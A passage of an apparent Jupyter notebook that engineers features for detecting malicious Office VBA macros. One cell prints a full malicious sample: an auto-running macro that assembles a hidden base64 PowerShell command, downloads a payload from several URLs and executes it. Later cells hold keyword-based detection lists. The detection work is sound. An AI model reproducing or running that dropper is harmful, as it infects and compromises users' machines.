       "4        'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "7        'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "11       Sub Document_Open()\\nPRekl = \"cG93ZXJzaGVsbCAt...\n",
       "                               ...                        \n",
       "31881    'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "31882    'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "31883    'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "31886    'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "31887    'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "Name: vba_code, Length: 15810, dtype: object"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "mal = train_df[train_df['label'] == 'mal']\n",
    "mal.vba_code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "2f6f319a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Sub Document_Open()\\nPRekl = \"cG93ZXJzaGVsbCAt\"\\nJcsmLFtP = \"V2luZG93U3R5bGUgSGlkZGVuICR3c2NyaXB0ID0gbmV3LW9iamVjdCAtQ29tT2JqZWN0IFdT\"\\nsnWqf0 = \"Y3JpcHQuU2hlbGw7JHdlYmNsaWVudCA9I\"\\np6Fjxva = PRekl & JcsmLFtP & snWqf0\\nJzo4Ht3V = \"jaCgkdXJsIGluICR1cmxzKXt0cnl7JHdlYmNsaWVudC5Eb3dubG9hZEZpbGUoJHVybC5Ub1N\"\\ngsoVWb = \"0cmluZygpLCAkcGF0aCk7U\"\\nG5AtFf3LO = Jzo4Ht3V & gsoVWb\\naj04c = \"G5ldy1vYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JH\"\\nSY1KOT = \"JhbmRvbSA9IG5ldy1vYmplY3QgcmFuZG9tOyR1\"\\nmy2FUgcR = \"cmxzID0g\"\\nCMzLkgQ = \"J2h0dHA6Ly9zaWluZGlh\"\\nHBzLujm = aj04c & SY1KOT & my2FUgcR & CMzLkgQ\\nv06idMrR = \"LmluL29hZ2NtZ2dwYS8saHR0cDovL3d3dy50b2RvZnJvZy5jb20vcHpway8saHR0cDovL3Nl\"\\ncVInx = \"Z3Vyb2RlY2VuYWxzaW5vY3Quc2VndXJveC5lcy9nbi8saHR0cDovL\"\\nZVfcRrWvg = v06idMrR & cVInx\\nxZnKJq9h = \"3Jnd\"\\nrcO8LUIa = \"jIuY29tL3dqYmxud3kvLGh0dHA6Ly9ncmFjZXRoZXdlYi5jby51ay9jZHliaC8nLlNwbGl0KCcsJyk7\"\\nUi3Zz = xZnKJq9h & rcO8LUIa\\nIFihGa = \"JG5hbWUgPSAkcmFuZG9tLm5leHQoMSwgNjU1MzYpOyRwYXRo\"\\nZpqxNk = \"ID0gJGVudjp0ZW1wICsgJ1wnICsgJG5hbWUgKyAnL\\nSub runm(beJWfwrY)\\n\\n\\nJzZ93pBm = uHu62x(beJWfwrY)\\n\\nfemEHsXIl. _\\nb4dZzNp9 JzZ93pBm, 0\\n\\nEnd Sub\\nFunction uHu62x(GgLvl) As String\\n\\nSet g9Bn5dZK = New MSXML2.DOMDocument\\nSet aNoyOUfxj = g9Bn5dZK.createElement(GKae9x)\\n\\nWith aNoyOUfxj\\n.dataType = \"bin.base64\"\\n.text = GgLvl\\nuHu62x = aNoyOUfxj.nodeTypedValue\\nX7HP19AGa = 189 - 33\\nEnd With\\n\\nSet aNoyOUfxj = Nothing\\nSet g9Bn5dZK = Nothing\\nEnd Function\\nPublic Const GKae9x = \"BASE64\"\\nPublic Sub b4dZzNp9(VVIdluTbh, ReQqh)\\nDim uayfWOiHD As String\\nuayfWOiHD = StrConv(VVIdluTbh, 64)\\n\\nShell uayfWOiHD, ReQqh\\n\\nEnd Sub'"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "mal.vba_code[11]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "5579e9b3",
   "metadata": {},
   "outputs": [],
   "source": [
    "# private libraries (passwords, and personal data..)\n",
    "information_disclosure_keywords = ['winmgmts', 'Win32_Process', 'shell', \n",
    "                                   'ssn', 'secret', 'pwd', 'shadow', 'bypass', \n",
    "                                  'EvilClippy', 'decodeBase64', 'CreateObject',\n",
    "                                  'CommandLine', 'Auto_open', 'Replace', 'Based',\n",
    "                                  'Worksheet_Change', 'bin.base64', 'open']\n",
    "\n",
    "# Define a function to check for the presence of information disclosure keywords\n",
    "def has_information_disclosure(code):\n",
    "    for keyword in information_disclosure_keywords:\n",
    "        if keyword in code.lower():\n",
    "            return 1\n",
    "    return 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "d5303aea",
   "metadata": {},
   "outputs": [],
   "source": [
    "train_df['has_information_disclosure'] = train_df['vba_code'].apply(has_information_disclosure)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "id": "e06c7ef3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "has_information_disclosure\n",
       "1    14903\n",
       "0      907\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# train_df['has_information_disclosure'].value_counts()\n",
    "train_df[train_df['label'] == 'mal']['has_information_disclosure'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "4a7b25d9",
   "metadata": {},
   "outputs": [],
   "source": [
    "# basic obfuscation or not (use de-obfuscation methods if yes)\n",
    "obfuscation_indicators = [\n",
    "    'Chr(', 'Hex(', 'Execute(', 'Base64Decode(',\n",
    "    'Environ(', 'Shell(', 'WScript.Shell', 'GetFile(', 'MSXML2.ServerXMLHTTP', \n",
    "    'CreateObject(\"MSXML2.XMLHTTP\")', 'CreateObject(\"ADODB.Stream\")', \n",
    "    'Randomize', 'Replace('\n",
    "]\n",
    "\n",
    "# Define a function to check for the presence of obfuscation indicators\n",
    "def is_obfuscated(code):\n",
    "    for indicator in obfuscation_indicators:\n",
    "        if indicator in code:\n",
    "            return 1\n",
    "    return 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "54ad8a7e",
   "metadata": {},
   "outputs": [],
   "source": [
    "train_df['is_obfuscated'] = train_df['vba_code'].apply(is_obfuscated)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "307beef1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "is_obfuscated\n",
       "0    14227\n",
       "1     1851\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df[train_df['label'] == 'white']['is_obfuscated'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "888028ba",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "is_obfuscated\n",
       "1    12647\n",
       "0     3163\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df[train_df['label'] == 'mal']['is_obfuscated'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "7e711f54",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>vba_code</th>\n",
       "      <th>vba_code_without_comments</th>\n",
       "      <th>cleaned_vba_code</th>\n",
       "      <th>code_length</th>\n",
       "      <th>num_lines</th>\n",
       "      <th>avg_chars_per_line</th>\n",
       "      <th>num_exclamation_marks</th>\n",
       "      <th>num_loops</th>\n",
       "      <th>num_loops_length</th>\n",
       "      <th>num_functions</th>\n",
       "      <th>num_numeric_literals</th>\n",
       "      <th>num_string_literals</th>\n",
       "      <th>has_error_handling</th>\n",
       "      <th>has_url_or_ip</th>\n",
       "      <th>has_information_disclosure</th>\n",
       "      <th>is_obfuscated</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>white</td>\n",
       "      <td>Private Sub Workbook_BeforeClose(Cancel As Boo...</td>\n",
       "      <td>Private Sub Workbook_BeforeClose(Cancel As Boo...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as bool...</td>\n",
       "      <td>1070</td>\n",
       "      <td>34</td>\n",
       "      <td>31.470588</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.003738</td>\n",
       "      <td>0.001869</td>\n",
       "      <td>0.005607</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>white</td>\n",
       "      <td>Option Explicit\\nOption Explicit\\nOption Expli...</td>\n",
       "      <td>Option Explicit\\nOption Explicit\\nOption Expli...</td>\n",
       "      <td>option explicit option explicit option explici...</td>\n",
       "      <td>13092</td>\n",
       "      <td>420</td>\n",
       "      <td>31.171429</td>\n",
       "      <td>0.000229</td>\n",
       "      <td>23</td>\n",
       "      <td>0.000687</td>\n",
       "      <td>0.002215</td>\n",
       "      <td>0.008631</td>\n",
       "      <td>0.006416</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31883</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31884</th>\n",
       "      <td>white</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub Workbook_Open()...</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub Workbook_Open()...</td>\n",
       "      <td>option explicit private sub workbook_open appl...</td>\n",
       "      <td>12274</td>\n",
       "      <td>402</td>\n",
       "      <td>30.532338</td>\n",
       "      <td>0.000244</td>\n",
       "      <td>23</td>\n",
       "      <td>0.000081</td>\n",
       "      <td>0.003340</td>\n",
       "      <td>0.007414</td>\n",
       "      <td>0.003748</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31885</th>\n",
       "      <td>white</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub CFixPicture_Act...</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub CFixPicture_Act...</td>\n",
       "      <td>option explicit private sub cfixpicture_activa...</td>\n",
       "      <td>1000</td>\n",
       "      <td>42</td>\n",
       "      <td>23.809524</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.006000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31886</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31887</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>31888 rows × 17 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "       label                                           vba_code  \\\n",
       "0      white  Private Sub Workbook_BeforeClose(Cancel As Boo...   \n",
       "1      white  Option Explicit\\nOption Explicit\\nOption Expli...   \n",
       "2        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "3        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "4        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "...      ...                                                ...   \n",
       "31883    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "31884  white  Option Explicit\\n\\nPrivate Sub Workbook_Open()...   \n",
       "31885  white  Option Explicit\\n\\nPrivate Sub CFixPicture_Act...   \n",
       "31886    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "31887    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "\n",
       "                               vba_code_without_comments  \\\n",
       "0      Private Sub Workbook_BeforeClose(Cancel As Boo...   \n",
       "1      Option Explicit\\nOption Explicit\\nOption Expli...   \n",
       "2      \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "3      \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "4      \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "...                                                  ...   \n",
       "31883  \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "31884  Option Explicit\\n\\nPrivate Sub Workbook_Open()...   \n",
       "31885  Option Explicit\\n\\nPrivate Sub CFixPicture_Act...   \n",
       "31886  \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "31887  \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "\n",
       "                                        cleaned_vba_code  code_length  \\\n",
       "0      private sub workbook_beforeclosecancel as bool...         1070   \n",
       "1      option explicit option explicit option explici...        13092   \n",
       "2       private sub workbook_beforeclosecancel as boo...         3428   \n",
       "3       private sub workbook_beforeclosecancel as boo...         3428   \n",
       "4       private sub workbook_beforeclosecancel as boo...         3428   \n",
       "...                                                  ...          ...   \n",
       "31883   private sub workbook_beforeclosecancel as boo...         3428   \n",
       "31884  option explicit private sub workbook_open appl...        12274   \n",
       "31885  option explicit private sub cfixpicture_activa...         1000   \n",
       "31886   private sub workbook_beforeclosecancel as boo...         3428   \n",
       "31887   private sub workbook_beforeclosecancel as boo...         3428   \n",
       "\n",
       "       num_lines  avg_chars_per_line  num_exclamation_marks  num_loops  \\\n",
       "0             34           31.470588               0.000000          0   \n",
       "1            420           31.171429               0.000229         23   \n",
       "2             86           39.860465               0.002042          1   \n",
       "3             86           39.860465               0.002042          1   \n",
       "4             86           39.860465               0.002042          1   \n",
       "...          ...                 ...                    ...        ...   \n",
       "31883         86           39.860465               0.002042          1   \n",
       "31884        402           30.532338               0.000244         23   \n",
       "31885         42           23.809524               0.000000          0   \n",
       "31886         86           39.860465               0.002042          1   \n",
       "31887         86           39.860465               0.002042          1   \n",
       "\n",
       "       num_loops_length  num_functions  num_numeric_literals  \\\n",
       "0              0.000000       0.003738              0.001869   \n",
       "1              0.000687       0.002215              0.008631   \n",
       "2              0.000292       0.002334              0.019253   \n",
       "3              0.000292       0.002334              0.019253   \n",
       "4              0.000292       0.002334              0.019253   \n",
       "...                 ...            ...                   ...   \n",
       "31883          0.000292       0.002334              0.019253   \n",
       "31884          0.000081       0.003340              0.007414   \n",
       "31885          0.000000       0.006000              0.000000   \n",
       "31886          0.000292       0.002334              0.019253   \n",
       "31887          0.000292       0.002334              0.019253   \n",
       "\n",
       "       num_string_literals  has_error_handling  has_url_or_ip  \\\n",
       "0                 0.005607                   0              0   \n",
       "1                 0.006416                   1              0   \n",
       "2                 0.008460                   0              1   \n",
       "3                 0.008460                   0              1   \n",
       "4                 0.008460                   0              1   \n",
       "...                    ...                 ...            ...   \n",
       "31883             0.008460                   0              1   \n",
       "31884             0.003748                   1              0   \n",
       "31885             0.000000                   1              0   \n",
       "31886             0.008460                   0              1   \n",
       "31887             0.008460                   0              1   \n",
       "\n",
       "       has_information_disclosure  is_obfuscated  \n",
       "0                               1              0  \n",
       "1                               1              0  \n",
       "2                               1              1  \n",
       "3                               1              1  \n",
       "4                               1              1  \n",
       "...                           ...            ...  \n",
       "31883                           1              1  \n",
       "31884                           1              0  \n",
       "31885                           0              0  \n",
       "31886                           1              1  \n",
       "31887                           1              1  \n",
       "\n",
       "[31888 rows x 17 columns]"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ec98d07e",
   "metadata": {},
   "source": [
    "### visualization"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "cbf1bc39",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>vba_code</th>\n",
       "      <th>vba_code_without_comments</th>\n",
       "      <th>cleaned_vba_code</th>\n",
       "      <th>code_length</th>\n",
       "      <th>num_lines</th>\n",
       "      <th>avg_chars_per_line</th>\n",
       "      <th>num_exclamation_marks</th>\n",
       "      <th>num_loops</th>\n",
       "      <th>num_loops_length</th>\n",
       "      <th>num_functions</th>\n",
       "      <th>num_numeric_literals</th>\n",
       "      <th>num_string_literals</th>\n",
       "      <th>has_error_handling</th>\n",
       "      <th>has_url_or_ip</th>\n",
       "      <th>has_information_disclosure</th>\n",
       "      <th>is_obfuscated</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>Private Sub Workbook_BeforeClose(Cancel As Boo...</td>\n",
       "      <td>Private Sub Workbook_BeforeClose(Cancel As Boo...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as bool...</td>\n",
       "      <td>1070</td>\n",
       "      <td>34</td>\n",
       "      <td>31.470588</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.003738</td>\n",
       "      <td>0.001869</td>\n",
       "      <td>0.005607</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>Option Explicit\\nOption Explicit\\nOption Expli...</td>\n",
       "      <td>Option Explicit\\nOption Explicit\\nOption Expli...</td>\n",
       "      <td>option explicit option explicit option explici...</td>\n",
       "      <td>13092</td>\n",
       "      <td>420</td>\n",
       "      <td>31.171429</td>\n",
       "      <td>0.000229</td>\n",
       "      <td>23</td>\n",
       "      <td>0.000687</td>\n",
       "      <td>0.002215</td>\n",
       "      <td>0.008631</td>\n",
       "      <td>0.006416</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31883</th>\n",
       "      <td>0</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31884</th>\n",
       "      <td>1</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub Workbook_Open()...</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub Workbook_Open()...</td>\n",
       "      <td>option explicit private sub workbook_open appl...</td>\n",
       "      <td>12274</td>\n",
       "      <td>402</td>\n",
       "      <td>30.532338</td>\n",
       "      <td>0.000244</td>\n",
       "      <td>23</td>\n",
       "      <td>0.000081</td>\n",
       "      <td>0.003340</td>\n",
       "      <td>0.007414</td>\n",
       "      <td>0.003748</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31885</th>\n",
       "      <td>1</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub CFixPicture_Act...</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub CFixPicture_Act...</td>\n",
       "      <td>option explicit private sub cfixpicture_activa...</td>\n",
       "      <td>1000</td>\n",
       "      <td>42</td>\n",
       "      <td>23.809524</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.006000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31886</th>\n",
       "      <td>0</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31887</th>\n",
       "      <td>0</td>\n",
